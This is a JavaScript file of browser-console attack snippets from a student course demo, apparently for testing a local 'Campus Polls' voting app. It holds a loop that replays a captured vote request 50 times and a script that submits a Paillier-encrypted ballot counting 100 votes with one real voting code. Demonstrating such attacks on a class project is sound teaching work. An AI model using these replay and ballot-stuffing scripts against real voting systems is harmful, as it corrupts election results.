// Browser-console attacks for the Campus Polls demo (CMPS 380 Group G03).
// Open the voter page, press F12 and use the Console tab.

// ---------------------------------------------------------------------------
// 1. REPLAY: resend a captured vote 50 times
// Vote once on the page. In DevTools > Network, right-click the "vote" request >
// Copy > Copy as fetch. In the Console type this first line, paste the copied
// fetch(...) after it, and press Enter:
//
//   for (let i = 0; i < 50; i++) fetch("http://localhost:5050/api/vote", { ...pasted... });
//
// To see the server's answers instead of just sending, use this version
// (replace BODY with the "body" string from the copied fetch):
//
//   for (let i = 0; i < 50; i++) fetch("/api/vote", {method: "POST", headers: {"Content-Type": "application/json"}, body: BODY}).then(r => r.json()).then(r => console.log(i + 1, r.message));

// ---------------------------------------------------------------------------
// 2. MALICIOUS BALLOT: one voter encrypts 100 instead of 1 (protected poll)
// Paste all of this into the Console on the voter page and press Enter.
(async () => {
  const e = (await (await fetch("/api/state")).json()).election;
  const send = (url, body) => fetch(url, { method: "POST", headers: { "Content-Type": "application/json" },
    body: JSON.stringify(body) }).then((r) => r.json());
  const { code } = await send("/api/register", { election_id: e.id });
  const n = BigInt(e.paillier_n);
  const ciphertexts = e.options.map((o, i) => Paillier.encrypt(i === 0 ? 100 : 0, n).toString());
  console.log(`Encrypted 100 votes for ${e.options[0]} with a real voting code (${code})...`);
  console.log(await send("/api/vote", { election_id: e.id, code, ciphertexts }));
})();
